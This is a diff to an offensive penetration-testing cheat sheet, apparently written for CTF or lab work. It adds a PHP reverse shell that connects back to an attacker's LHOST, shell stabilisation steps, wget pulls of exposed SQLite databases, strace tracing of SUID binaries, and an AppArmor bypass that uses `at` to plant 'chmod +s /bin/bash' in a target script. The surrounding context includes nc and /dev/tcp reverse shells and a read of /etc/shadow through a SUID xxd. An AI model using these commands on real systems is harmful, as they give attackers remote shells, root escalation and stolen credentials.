@@ -90,6 +90,23 @@ cadaver http://<target>/webdav
 # interactive: ls, put <file>, get <file>, mput, mget
 ```
 
+### sqlite3 — Exposed SQLite Databases
+
+```bash
+# Download and inspect an exposed SQLite DB (e.g. from /config/bases/ on SPIP)
+wget http://<target>/path/to/db.sqlite
+sqlite3 db.sqlite
+
+# List tables
+sqlite> .tables
+
+# Dump a table
+sqlite> SELECT * FROM <table>;
+
+# Schema
+sqlite> .schema <table>
+```
+
 ---
 
 ## 💉 SQL Injection
@@ -169,15 +186,28 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> >/tm
 
 # bash
 bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+
+# PHP (trigger via webshell cmd parameter)
+php -r '$sock=fsockopen("<LHOST>",<LPORT>);shell_exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
 ### Shell Stabilisation
 
 ```bash
+# Method 1 — python pty
 /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
 # ctrl+z
 stty raw -echo; fg
 export TERM='xterm'
+stty rows <rows> cols <cols>
+```
+
+```bash
+# Method 2 — script (use when python is unavailable)
+script /dev/null -c bash
+# ctrl+z
+stty raw -echo; fg
+export TERM=xterm
 stty rows <rows> cols <cols>
 ```
 
@@ -421,7 +451,22 @@ ls -la /etc/cron*
 
 # Internal services
 ss -ntlp
+
+# Files owned by a specific user
+find / -type f -user <username> 2>/dev/null | xargs ls -lah
 ```
+
+### SUID Binary Analysis — strace
+
+```bash
+# Trace what a SUID binary actually executes (scripts, files, syscalls)
+strace /path/to/suid_binary 2>&1 | grep -iE 'exec|open|read'
+
+# Focus on file opens and exec calls
+strace /path/to/suid_binary 2>&1 | grep -E 'execve|openat|stat'
+```
+
+Useful when a non-standard SUID binary has no manpage — strace reveals the script or config it loads, which may be world-writable.
 
 ### SUID Binary Abuse
 
@@ -438,6 +483,29 @@ su - hacker
 
 # SUID xxd — arbitrary file read
 /opt/xxd /etc/shadow | xxd -r
+```
+
+### AppArmor Bypass via `at`
+
+```bash
+# Check if AppArmor is active
+aa-status 2>/dev/null
+
+# If direct writes to a target path are blocked by AppArmor (even if POSIX perms allow it):
+# - vi and text editors will also be restricted under the confined context
+# - Use echo >> to build a script instead of opening an editor
+# - Schedule the write via `at` — at jobs run through /bin/sh outside the shell's AppArmor profile
+
+# Build injection script using echo (editor blocked by AppArmor)
+echo '#!/bin/bash' >> /var/tmp/inject.sh
+echo 'echo "chmod +s /bin/bash" > /opt/target_script.sh' >> /var/tmp/inject.sh
+chmod +x /var/tmp/inject.sh
+
+# Schedule via at — executes outside confined shell context
+at now -f /var/tmp/inject.sh
+
+# Verify the write landed
+tail -1 /opt/target_script.sh
 ```
 
 ### Writable Cron Script
